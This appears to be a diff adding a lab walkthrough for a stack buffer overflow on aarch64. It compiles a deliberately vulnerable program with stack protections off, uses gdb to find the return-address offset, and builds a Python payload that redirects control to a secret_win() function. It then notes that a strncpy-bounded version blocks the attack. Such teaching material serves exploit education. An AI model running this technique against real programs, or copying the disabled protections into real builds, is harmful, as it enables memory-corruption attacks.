@@ -1,0 +1,31 @@
+# Compile (canary, PIE, ASLR-sensitive flags off per levels.yaml):
+gcc -g -fno-stack-protector -fno-pie -no-pie -z execstack -o vuln vuln.c
+
+# Step 1 -- find the offset from buffer to the saved return address:
+gdb ./vuln
+(gdb) disassemble vulnerable_read
+(gdb) print &buffer      # note the address
+# On aarch64 the return address is held in x30 and spilled to the stack;
+# use `info frame` and `x/20xg $sp` around the call to locate exactly
+# where it's stored for THIS binary/compiler -- offsets are not portable
+# across architectures or compiler versions, must be found interactively.
+
+# Step 2 -- find secret_win()'s address:
+(gdb) print secret_win
+
+# Step 3 -- craft a payload: <offset bytes of filler> + <secret_win address,
+# correct endianness/width for aarch64> and pass it as argv[1].
+# Example construction (adjust OFFSET and ADDR to what gdb showed you):
+python3 -c "
+import struct, sys
+offset = OFFSET
+addr = ADDR
+payload = b'A' * offset + struct.pack('<Q', addr)
+sys.stdout.buffer.write(payload)
+" > /tmp/payload
+
+./vuln "$(cat /tmp/payload)"
+-> *** secret_win() reached -- control flow redirected ***
+
+# secure.c -> strncpy bounds the copy, the overflow never reaches the
+# return address, secret_win() is never reached regardless of input.
